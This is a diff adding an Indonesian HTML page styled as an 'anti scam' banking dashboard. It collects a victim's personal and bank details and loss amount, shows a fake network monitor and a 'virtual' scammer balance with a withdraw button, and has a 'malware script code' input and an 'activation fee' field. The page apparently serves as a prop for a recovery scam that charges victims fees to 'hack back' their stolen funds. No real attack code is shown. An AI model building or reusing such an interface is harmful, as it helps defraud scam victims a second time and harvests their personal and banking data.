@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+<title>System Panel</title>
+<script>
+  const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
+  const applyTheme = (isDark) => {
+    document.documentElement.classList.toggle('dark', isDark);
+  };
+  applyTheme(mediaQuery.matches);
+  mediaQuery.addEventListener('change', (e) => applyTheme(e.matches));
+</script>
+
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="style.css">
+</head>
+
+<body class="font-mono min-h-screen flex flex-col md:flex-row">
+
+<!-- SIDEBAR -->
+<div class="w-full md:w-72 border-b md:border-b-0 md:border-r border-slate-300 dark:border-slate-700 p-4 space-y-4">
+
+<div class="flex items-center gap-2">
+    <img src="logo.png" alt="Logo" class="w-[220px] h-10 object-fill">
+</div>
+<p class="text-xs text-emerald-600 dark:text-emerald-400">STATUS: ONLINE</p>
+
+<!-- INFORMASI KORBAN -->
+<div class="box">
+    <h2>INFORMASI KORBAN</h2>
+    <div class="space-y-2 text-xs">
+        <div>
+            <label for="victim-full-name">Nama Lengkap Penerima :</label>
+            <input id="victim-full-name" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="victim-address">Alamat Lengkap :</label>
+            <input id="victim-address" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="victim-phone">Nomor Telpon :</label>
+            <input id="victim-phone" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="victim-job">Pekerjaan :</label>
+            <input id="victim-job" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="victim-role">Jabatan (Opsional) :</label>
+            <input id="victim-role" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="victim-account-number">No Rekening Penerima :</label>
+            <input id="victim-account-number" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="victim-bank-name">Nama Bank Penerima :</label>
+            <input id="victim-bank-name" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="loss-amount">Total Kerugian Rp :</label>
+            <input id="loss-amount" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1" placeholder="Contoh: 10.000.000">
+        </div>
+    </div>
+</div>
+
+<!-- TARGET INFORMASI -->
+<div class="box">
+    <h2>TARGET INFORMASI</h2>
+    <div class="space-y-2 text-xs">
+        <div>
+            <label for="target-contact">Nomor Telpon / User ID :</label>
+            <input id="target-contact" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="target-scam-account">Rekening Pelaku Scam :</label>
+            <input id="target-scam-account" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="target-account-name">Nama Rekening Pelaku Scam :</label>
+            <input id="target-account-name" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+        <div>
+            <label for="target-bank-name">Nama Bank Pelaku :</label>
+            <input id="target-bank-name" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1">
+        </div>
+    </div>
+</div>
+
+<!-- KODE SCRIPT -->
+<div class="box">
+    <h2>KODE SCRIPT MALWARE</h2>
+    <input id="malware-script-code" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1"  placeholder="Masukkan kode script..."></input>
+</div>
+
+<!-- NETWORK -->
+<div class="box">
+<h2>NETWORK MONITOR</h2>
+<p>UPLINK: 12 KB/s</p>
+<p>DOWNLINK: 98 KB/s</p>
+<p>LATENCY: 23ms</p>
+</div>
+
+<div id="activation-panel" class="box">
+<h2>AKTIVASI PENARIKAN</h2>
+<div class="space-y-2 text-xs">
+    <div>
+        <label for="activation-fee">Biaya Aktivasi Rekening :</label>
+        <input id="activation-fee" type="text" class="w-full mt-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 p-1" value="">
+    </div>
+
+</div>
+</div>
+
+</div>
+
+<!-- MAIN -->
+<div class="flex-1 p-4 space-y-4">
+
+<h1 class="text-slate-900 dark:text-slate-100 text-lg">[ DASHBOARD MONITORING ANTI SCAM ]</h1>
+
+<div class="border border-blue-300 dark:border-blue-700 p-3 text-xs text-blue-800 dark:text-blue-200 bg-blue-50 dark:bg-blue-950/40">
+SISTEM PERBANKAN
+</div>
+
+<!-- VIRTUAL WITHDRAW -->
+<div class="panel p-0 overflow-hidden rounded-lg border-0 banking-panel-shell">
+<h2 class="px-4 pt-4 pb-2 text-sm tracking-wide text-white/95 banking-panel-title">DETECTION BANKING SYSTEM</h2>
+
+<div class="banking-hero-bg px-4 pb-4 pt-2">
+    <div class="grid md:grid-cols-2 gap-3 banking-cards">
+        <div class="bank-card bank-card-muted">
+            <p class="bank-card-label">REKENING PELAKU <span class="bank-badge">ADMIN</span></p>
+            <dl class="bank-dl">
+                <div><dt>Bank</dt><dd id="virtual-bank-name">-</dd></div>
+                <div><dt>No Rekening</dt><dd id="virtual-account-number" class="font-mono">-</dd></div>
+                <div class="bank-balance-row"><dt>Saldo Rekening</dt><dd>Rp&nbsp;<span id="virtual-balance">0</span></dd></div>
+            </dl>
+        </div>
+
+        <div class="bank-card bank-card-primary">
+            <p class="bank-card-label">REKENING PENERIMA</p>
+            <dl class="bank-dl">
+                <div><dt>Bank</dt><dd id="receiver-bank-name">-</dd></div>
+                <div><dt>No Rekening</dt><dd id="receiver-account-number" class="font-mono">-</dd></div>
+                <div><dt>Nama</dt><dd id="receiver-account-name">-</dd></div>
+                <div class="bank-balance-row bank-balance-highlight"><dt>Saldo Rekening</dt><dd>Rp&nbsp;<span id="receiver-balance">-</span></dd></div>
+            </dl>
+        </div>
+    </div>
+</div>
+
+<div class="px-4 pb-4 pt-2 space-y-3 bg-white/90 dark:bg-slate-900/95 banking-panel-actions">
+<div class="grid grid-cols-1 md:grid-cols-2 gap-2 text-xs">
+    <button id="verify-btn" onclick="verifyVirtualBalance()" class="btn w-full">VERIFIKASI REKENING</button>
+    <p id="query-status" class="status-pill status-idle">Status: menunggu verifikasi</p>
+</div>
+
+<!-- PROGRESS BAR -->
+<div class="w-full h-2 bg-slate-300 dark:bg-slate-700 rounded overflow-hidden mt-2">
+    <div id="progress" class="h-full bg-emerald-500 w-0 transition-all duration-200"></div>
+</div>
+<div class="text-xs text-right mt-1">
+    
+</div>
+
+<div class="grid grid-cols-1 md:grid-cols-2 gap-2 text-xs">
+    <button id="activate-account-btn" class="btn w-full hidden">ACTIVASI REKENING</button>
+    <button id="withdraw-btn" onclick="withdrawVirtual()" class="btn w-full">TARIK SALDO</button>
+</div>
+
+<div class="box text-xs">
+    <h3 class="text-blue-700 dark:text-blue-300 mb-2">RIWAYAT</h3>
+    <div id="withdraw-history" class="space-y-1 max-h-28 overflow-y-auto">
+        <p class="text-slate-600 dark:text-slate-300">Belum ada transaksi.</p>
+    </div>
+</div>
+</div>
+</div>
+
+<!-- MAP -->
+<div class="panel p-4">
+<h2>REAL TIME TRACKING FILE DATA SYSTEM</h2>
+<div id="map" class="h-40 mt-2 relative"></div>
+</div>
+
+<!-- TABLE -->
+<div class="panel p-4">
+<h2>RINGKASAN AKTIVITAS</h2>
+
+<table class="w-full text-xs mt-2">
+<tr class="border-b border-blue-800 dark:border-slate-700">
+<th>TIME</th>
+<th>FROM</th>
+<th>MESSAGE</th>
+<th>STATUS</th>
+</tr>
+
+</table>
+</div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
